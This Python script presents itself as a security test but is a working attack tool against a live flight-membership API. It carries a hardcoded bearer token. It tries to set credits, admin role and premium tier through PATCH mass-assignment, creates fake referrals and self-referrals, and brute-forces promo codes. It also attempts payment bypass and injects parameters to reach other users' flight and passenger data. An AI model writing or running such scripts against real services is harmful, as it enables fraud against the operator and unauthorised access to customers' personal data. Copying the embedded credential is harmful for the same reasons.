#!/usr/bin/env python3
"""
COMPREHENSIVE REFERRAL & CREDIT MANIPULATION TEST - CORRECT API
==============================================================
Using actual Vaunt API: vauntapi.flyvaunt.com
"""

import requests
import json
from datetime import datetime
import time

# Color codes
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

# CORRECT API Configuration
BASE_URL = "https://vauntapi.flyvaunt.com"
JWT_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoyMDI1NCwiaWF0IjoxNzYyMjMxMTE1LCJleHAiOjE3NjQ4MjMxMTV9.bOz6aK6v9G9B0H2BIXg_N5kWsiBizTbD-v1SlPl3B-Q"
USER_ID = 20254

results = {
    "timestamp": datetime.now().isoformat(),
    "api_host": BASE_URL,
    "baseline": {},
    "all_tests": [],
    "vulnerabilities": []
}

def req(method, endpoint, data=None, params=None, headers=None):
    """Make HTTP request"""
    url = f"{BASE_URL}{endpoint}"

    default_headers = {
        "Authorization": f"Bearer {JWT_TOKEN}",
        "Content-Type": "application/json",
        "x-app-platform": "ios",
        "x-device-id": "TEST-DEVICE-ID",
        "x-build-number": "219"
    }

    if headers:
        default_headers.update(headers)

    try:
        if method == "GET":
            resp = requests.get(url, headers=default_headers, params=params, timeout=10)
        elif method == "POST":
            resp = requests.post(url, headers=default_headers, json=data, timeout=10)
        elif method == "PATCH":
            resp = requests.patch(url, headers=default_headers, json=data, timeout=10)
        elif method == "PUT":
            resp = requests.put(url, headers=default_headers, json=data, timeout=10)
        elif method == "DELETE":
            resp = requests.delete(url, headers=default_headers, timeout=10)
        else:
            return 0, {}, "Invalid method"

        try:
            response_data = resp.json()
        except:
            response_data = {"raw_text": resp.text}

        return resp.status_code, response_data, None
    except Exception as e:
        return 0, {}, str(e)

def print_header(title):
    print(f"\n{Colors.BOLD}{Colors.CYAN}{'='*80}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.CYAN}{title}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.CYAN}{'='*80}{Colors.RESET}\n")

def print_test(name, status, response, error=None):
    if error:
        print(f"{Colors.RED}[ERROR] {name}: {error}{Colors.RESET}")
        return

    if status == 200 or status == 201:
        print(f"{Colors.GREEN}[{status}] {name}{Colors.RESET}")
        resp_str = json.dumps(response, indent=2)[:600]
        print(f"  {resp_str}")
    elif status == 401 or status == 403:
        print(f"{Colors.YELLOW}[{status}] {name} - BLOCKED{Colors.RESET}")
    elif status == 404:
        print(f"{Colors.BLUE}[{status}] {name} - NOT FOUND{Colors.RESET}")
    elif status == 400:
        print(f"{Colors.MAGENTA}[{status}] {name} - BAD REQUEST{Colors.RESET}")
        if response:
            print(f"  {json.dumps(response, indent=2)[:300]}")
    else:
        print(f"{Colors.MAGENTA}[{status}] {name}{Colors.RESET}")
        if response:
            print(f"  {json.dumps(response, indent=2)[:300]}")

def test_1_baseline():
    """Get baseline user data"""
    print_header("TEST 1: BASELINE DATA COLLECTION")

    tests = [
        ("GET", "/v1/user/", "User Profile"),
        ("GET", "/v1/subscription/pk", "Subscription"),
        ("GET", "/v1/user/checkStripePaymentMethod", "Payment Method"),
        ("GET", "/v1/flight-history", "Flight History"),
        ("GET", "/v2/flight/current", "Current Flights"),
        ("GET", "/v1/passenger", "Passenger Data"),
        ("GET", "/v1/person/", "Person Data"),
    ]

    for method, endpoint, desc in tests:
        status, response, error = req(method, endpoint)
        print_test(desc, status, response, error)

        if status == 200:
            results["baseline"][desc] = response

        results["all_tests"].append({
            "category": "baseline",
            "test": desc,
            "endpoint": endpoint,
            "status": status,
            "response": response
        })

def test_2_referral_discovery():
    """Discover referral endpoints"""
    print_header("TEST 2: REFERRAL ENDPOINT DISCOVERY")

    endpoints = [
        ("GET", "/v1/referral"),
        ("GET", "/v2/referral"),
        ("GET", "/v3/referral"),
        ("GET", "/v1/user/referrals"),
        ("GET", "/v1/referral/code"),
        ("GET", "/v1/referral/stats"),
        ("GET", "/v1/credits"),
        ("GET", "/v1/user/credits"),
        ("GET", "/v1/bonus"),
        ("GET", "/v1/promo"),
        ("GET", "/v1/rewards"),
        ("GET", "/v1/invite"),
        ("GET", "/v2/invite"),
        ("GET", "/v1/user/invite"),
    ]

    for method, endpoint in endpoints:
        status, response, error = req(method, endpoint)
        print_test(endpoint, status, response, error)

        if status in [200, 201]:
            results["vulnerabilities"].append({
                "type": "INFO - Referral Endpoint Found",
                "endpoint": endpoint,
                "status": status,
                "response": response
            })

def test_3_user_manipulation():
    """Test user field manipulation"""
    print_header("TEST 3: USER FIELD MANIPULATION")

    # First, get current user data
    status, user_data, _ = req("GET", "/v1/user/")
    print(f"\n{Colors.BOLD}Current User Data:{Colors.RESET}")
    if status == 200:
        print(json.dumps(user_data, indent=2)[:800])

        # Extract field names from current user data
        if isinstance(user_data, dict):
            print(f"\n{Colors.BOLD}Available Fields: {', '.join(user_data.keys())}{Colors.RESET}\n")

    # Try manipulating various fields
    manipulations = [
        {"credits": 9999},
        {"balance": 9999},
        {"referralCount": 100},
        {"referrals": 100},
        {"subscriptionTier": "premium"},
        {"membership": "vip"},
        {"role": "admin"},
        {"isAdmin": True},
        {"isPremium": True},
        {"freeFlights": 10},
        {"flightCredits": 100},
        {"accessLevel": 99},
        {"accountType": "corporate"},
        {"tier": "premium"},
        {"level": "unlimited"},
    ]

    for payload in manipulations:
        field_name = list(payload.keys())[0]
        status, response, error = req("PATCH", "/v1/user", data=payload)
        print_test(f"Set {field_name} = {payload[field_name]}", status, response, error)

        results["all_tests"].append({
            "category": "user_manipulation",
            "test": f"Manipulate {field_name}",
            "payload": payload,
            "status": status,
            "response": response
        })

        if status in [200, 201]:
            results["vulnerabilities"].append({
                "type": "CRITICAL - User Field Manipulation",
                "severity": "CRITICAL",
                "cvss": 9.1,
                "endpoint": "/v1/user",
                "payload": payload,
                "details": f"Successfully manipulated {field_name}"
            })

def test_4_fake_referrals():
    """Test fake referral generation"""
    print_header("TEST 4: FAKE REFERRAL GENERATION")

    tests = [
        ("POST", "/v1/referral/create", {"referredUserId": 99999}),
        ("POST", "/v1/referral/add", {"userId": 88888}),
        ("POST", "/v2/referral/register", {"referrer": USER_ID, "referee": 99999}),
        ("POST", "/v1/user/refer", {"email": "fake@test.com"}),
        ("POST", "/v1/invite/send", {"email": "exploit@test.com"}),
        ("POST", "/v1/referral", {"email": "test@fake.com"}),
    ]

    for method, endpoint, data in tests:
        status, response, error = req(method, endpoint, data=data)
        print_test(f"{endpoint} - {list(data.keys())[0]}", status, response, error)

        if status in [200, 201]:
            results["vulnerabilities"].append({
                "type": "CRITICAL - Fake Referral Generation",
                "severity": "CRITICAL",
                "cvss": 9.1,
                "endpoint": endpoint,
                "payload": data
            })

def test_5_self_referral():
    """Test self-referral"""
    print_header("TEST 5: SELF-REFERRAL EXPLOITATION")

    # Try to get own referral code first
    status, response, error = req("GET", "/v1/referral/code")
    referral_code = None
    if status == 200 and isinstance(response, dict):
        referral_code = response.get("code") or response.get("referralCode")
        if referral_code:
            print(f"{Colors.GREEN}Found referral code: {referral_code}{Colors.RESET}\n")

    tests = [
        ("POST", "/v1/referral/apply", {"code": referral_code} if referral_code else {"code": "SELF"}),
        ("POST", "/v1/referral/claim", {"referrerId": USER_ID}),
        ("POST", "/v1/invite/accept", {"userId": USER_ID}),
    ]

    for method, endpoint, data in tests:
        status, response, error = req(method, endpoint, data=data)
        print_test(endpoint, status, response, error)

        if status in [200, 201]:
            results["vulnerabilities"].append({
                "type": "HIGH - Self-Referral",
                "severity": "HIGH",
                "cvss": 7.5,
                "endpoint": endpoint
            })

def test_6_promo_codes():
    """Test common promo codes"""
    print_header("TEST 6: PROMO CODE BRUTE FORCE")

    codes = [
        "WELCOME", "WELCOME10", "FIRST", "FIRST10", "FREE", "FREE10",
        "NEWUSER", "VIP", "PREMIUM", "LAUNCH", "BETA", "ALPHA",
        "VAUNT", "VOLATO", "FLY", "FLIGHT", "CREDIT", "BONUS"
    ]

    endpoints_to_try = [
        "/v1/promo/apply",
        "/v1/referral/claim",
        "/v1/coupon/apply",
        "/v2/promo/apply",
    ]

    for endpoint in endpoints_to_try:
        print(f"\n{Colors.BOLD}Testing {endpoint}:{Colors.RESET}")
        for code in codes:
            status, response, error = req("POST", endpoint, {"code": code})

            if status in [200, 201]:
                print_test(f"WORKING CODE: {code}", status, response, error)
                results["vulnerabilities"].append({
                    "type": "HIGH - Valid Promo Code",
                    "severity": "HIGH",
                    "cvss": 7.0,
                    "code": code,
                    "endpoint": endpoint,
                    "response": response
                })
            elif status == 400:
                msg = response.get("message", "") if isinstance(response, dict) else ""
                if "already" in msg.lower() or "used" in msg.lower():
                    print(f"  [{status}] {code} - Already used/claimed")
                elif "invalid" not in msg.lower():
                    print(f"  [{status}] {code} - {msg[:50]}")

def test_7_payment_bypass():
    """Test payment bypass"""
    print_header("TEST 7: PAYMENT & SUBSCRIPTION BYPASS")

    tests = [
        ("PATCH", "/v1/user", {"paymentRequired": False}),
        ("PATCH", "/v1/user", {"subscriptionActive": True}),
        ("PATCH", "/v1/user", {"isPaying": False}),
        ("POST", "/v1/subscription/activate", {"skipPayment": True}),
        ("POST", "/v1/payment/bypass", {}),
    ]

    for method, endpoint, data in tests:
        status, response, error = req(method, endpoint, data=data)
        print_test(endpoint, status, response, error)

        if status in [200, 201]:
            results["vulnerabilities"].append({
                "type": "CRITICAL - Payment Bypass",
                "severity": "CRITICAL",
                "cvss": 9.8,
                "endpoint": endpoint,
                "payload": data
            })

def test_8_parameter_injection():
    """Test parameter injection"""
    print_header("TEST 8: PARAMETER INJECTION")

    tests = [
        ("GET", "/v1/user/", {"showAll": "true"}),
        ("GET", "/v1/user/", {"admin": "true"}),
        ("GET", "/v1/user/", {"includeSensitive": "true"}),
        ("GET", "/v1/passenger", {"showAll": "true"}),
        ("GET", "/v1/flight-history", {"limit": "9999"}),
        ("GET", "/v1/flight-history", {"includeAll": "true"}),
        ("GET", "/v2/flight/current", {"showExpired": "true"}),
        ("GET", "/v3/flight", {"showAll": "true", "admin": "true"}),
    ]

    for method, endpoint, params in tests:
        status, response, error = req(method, endpoint, params=params)
        param_str = ", ".join([f"{k}={v}" for k, v in params.items()])
        print_test(f"{endpoint}?{param_str}", status, response, error)

        if status == 200:
            # Check if we got more data than baseline
            baseline_key = None
            for key in results["baseline"]:
                if endpoint in str(results["baseline"][key]):
                    baseline_key = key
                    break

            if baseline_key and len(str(response)) > len(str(results["baseline"][baseline_key])) * 1.5:
                results["vulnerabilities"].append({
                    "type": "HIGH - Parameter Injection Data Exposure",
                    "severity": "HIGH",
                    "cvss": 7.5,
                    "endpoint": endpoint,
                    "params": params,
                    "details": "Excessive data returned with injected parameters"
                })

def test_9_v3_api():
    """Test V3 API for vulnerabilities"""
    print_header("TEST 9: V3 API PARAMETER INJECTION")

    # Known V3 endpoint from logs
    base_tests = [
        {"includeExpired": "true"},
        {"nearMe": "true"},
        {"showAll": "true"},
        {"admin": "true"},
        {"debug": "true"},
        {"bypass": "true"},
        {"userId": str(USER_ID)},
        {"includeExpired": "true", "nearMe": "true", "showAll": "true"},
    ]

    for params in base_tests:
        status, response, error = req("GET", "/v3/flight", params=params)
        param_str = ", ".join([f"{k}={v}" for k, v in params.items()])
        print_test(f"/v3/flight?{param_str}", status, response, error)

        if status == 200 and isinstance(response, list):
            print(f"  {Colors.CYAN}Returned {len(response)} flights{Colors.RESET}")

            # Check if any flights belong to other users
            other_user_flights = []
            for flight in response:
                if isinstance(flight, dict):
                    passengers = flight.get("passengers", [])
                    for p in passengers:
                        if isinstance(p, dict) and p.get("userId") != USER_ID:
                            other_user_flights.append(flight.get("id"))

            if other_user_flights:
                results["vulnerabilities"].append({
                    "type": "CRITICAL - Unauthorized Data Access",
                    "severity": "CRITICAL",
                    "cvss": 8.2,
                    "endpoint": "/v3/flight",
                    "params": params,
                    "details": f"Exposed {len(other_user_flights)} flights from other users"
                })

def test_10_verify_changes():
    """Verify if any changes occurred"""
    print_header("TEST 10: VERIFICATION - CHECK FOR CHANGES")

    endpoints = [
        ("GET", "/v1/user/", "User Profile"),
        ("GET", "/v1/subscription/pk", "Subscription"),
    ]

    for method, endpoint, desc in endpoints:
        status, response, error = req(method, endpoint)

        if status == 200 and desc in results["baseline"]:
            before = results["baseline"][desc]
            after = response

            if before != after:
                print(f"{Colors.RED}CHANGED: {desc}{Colors.RESET}")
                print(f"\n{Colors.YELLOW}Before:{Colors.RESET}")
                print(json.dumps(before, indent=2)[:400])
                print(f"\n{Colors.YELLOW}After:{Colors.RESET}")
                print(json.dumps(after, indent=2)[:400])

                results["vulnerabilities"].append({
                    "type": "CRITICAL - Data Changed",
                    "severity": "CRITICAL",
                    "details": f"{desc} was modified by our tests",
                    "before": before,
                    "after": after
                })
            else:
                print(f"{Colors.GREEN}NO CHANGE: {desc}{Colors.RESET}")

def generate_final_report():
    """Generate comprehensive report"""
    print_header("FINAL SECURITY ASSESSMENT")

    critical = [v for v in results["vulnerabilities"] if v.get("severity") == "CRITICAL"]
    high = [v for v in results["vulnerabilities"] if v.get("severity") == "HIGH"]
    info = [v for v in results["vulnerabilities"] if v.get("severity") == "INFO"]

    print(f"{Colors.BOLD}VULNERABILITY SUMMARY:{Colors.RESET}")
    print(f"  {Colors.RED}CRITICAL: {len(critical)}{Colors.RESET}")
    print(f"  {Colors.YELLOW}HIGH: {len(high)}{Colors.RESET}")
    print(f"  {Colors.BLUE}INFO: {len(info)}{Colors.RESET}")
    print(f"  Total: {len(results['vulnerabilities'])}")

    print(f"\n{Colors.BOLD}ANSWER TO KEY QUESTIONS:{Colors.RESET}")

    # Check each category
    referral_endpoints = [v for v in results["vulnerabilities"] if "Referral Endpoint" in v.get("type", "")]
    print(f"\n1. Do referral endpoints exist?")
    print(f"   {Colors.GREEN if referral_endpoints else Colors.RED}{'YES' if referral_endpoints else 'NO'}{Colors.RESET}")

    fake_ref = [v for v in results["vulnerabilities"] if "Fake Referral" in v.get("type", "")]
    print(f"\n2. Can user generate fake referrals?")
    print(f"   {Colors.RED if fake_ref else Colors.GREEN}{'YES - CRITICAL!' if fake_ref else 'NO'}{Colors.RESET}")

    self_ref = [v for v in results["vulnerabilities"] if "Self-Referral" in v.get("type", "")]
    print(f"\n3. Can user self-refer?")
    print(f"   {Colors.RED if self_ref else Colors.GREEN}{'YES - HIGH RISK!' if self_ref else 'NO'}{Colors.RESET}")

    credit_manip = [v for v in results["vulnerabilities"] if "Manipulation" in v.get("type", "") or "Field Manipulation" in v.get("type", "")]
    print(f"\n4. Can user manipulate credits/balance?")
    print(f"   {Colors.RED if credit_manip else Colors.GREEN}{'YES - CRITICAL!' if credit_manip else 'NO'}{Colors.RESET}")

    promo_codes = [v for v in results["vulnerabilities"] if "Promo Code" in v.get("type", "")]
    print(f"\n5. Working promo codes found:")
    if promo_codes:
        for p in promo_codes:
            print(f"   {Colors.YELLOW}- {p.get('code')}{Colors.RESET}")
    else:
        print(f"   {Colors.GREEN}None{Colors.RESET}")

    payment_bypass = [v for v in results["vulnerabilities"] if "Payment Bypass" in v.get("type", "")]
    print(f"\n6. Can bypass payment?")
    print(f"   {Colors.RED if payment_bypass else Colors.GREEN}{'YES - CRITICAL!' if payment_bypass else 'NO'}{Colors.RESET}")

    if critical:
        print(f"\n{Colors.BOLD}{Colors.RED}CRITICAL VULNERABILITIES:{Colors.RESET}")
        for i, v in enumerate(critical, 1):
            print(f"\n{i}. {v['type']}")
            print(f"   Endpoint: {v.get('endpoint', 'N/A')}")
            print(f"   CVSS: {v.get('cvss', 'N/A')}")
            print(f"   Details: {v.get('details', 'See response')}")

    # Save results
    with open('/home/user/vaunt/api_testing/comprehensive_referral_results.json', 'w') as f:
        json.dump(results, indent=2, fp=f)

    print(f"\n{Colors.BOLD}Full results saved to:/home/user/vaunt/api_testing/comprehensive_referral_results.json{Colors.RESET}")

def main():
    print(f"\n{Colors.BOLD}{Colors.MAGENTA}")
    print("=" * 80)
    print("COMPREHENSIVE REFERRAL & CREDIT MANIPULATION SECURITY TEST")
    print("=" * 80)
    print(f"{Colors.RESET}\n")

    print(f"{Colors.BOLD}Configuration:{Colors.RESET}")
    print(f"  API: {BASE_URL}")
    print(f"  User ID: {USER_ID}")
    print(f"  Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

    # Run all tests
    test_1_baseline()
    test_2_referral_discovery()
    test_3_user_manipulation()
    test_4_fake_referrals()
    test_5_self_referral()
    test_6_promo_codes()
    test_7_payment_bypass()
    test_8_parameter_injection()
    test_9_v3_api()
    test_10_verify_changes()

    # Generate report
    generate_final_report()

if __name__ == "__main__":
    main()
